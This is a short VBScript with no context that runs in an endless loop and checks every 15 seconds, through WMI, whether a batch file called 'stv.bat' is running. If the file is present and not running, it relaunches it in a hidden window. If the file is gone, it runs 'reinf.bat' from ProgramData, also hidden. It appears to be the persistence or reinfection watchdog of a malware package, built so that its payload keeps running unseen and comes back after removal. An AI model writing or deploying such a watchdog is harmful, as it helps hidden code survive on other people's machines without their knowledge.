Do
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
strUser = CreateObject("WScript.Network").UserName
A = "0"
filename = "stv.bat"
Set wmi = GetObject("winmgmts://./root/cimv2")
qry = "SELECT * FROM Win32_Process WHERE CommandLine LIKE '%" & filename & "%'"
For Each p In wmi.ExecQuery(qry)
  A = "1"
Next
name = scriptdir + "\stv.bat"
If fso.FileExists(scriptdir + "\stv.bat") Then
  If A = "0" Then WshShell.Run chr(34) & name & Chr(34), 0
Else
  WshShell.Run chr(34) & "C:\ProgramData\RI\reinf.bat" & Chr(34), 0
End If
WScript.Sleep(15000)
Loop
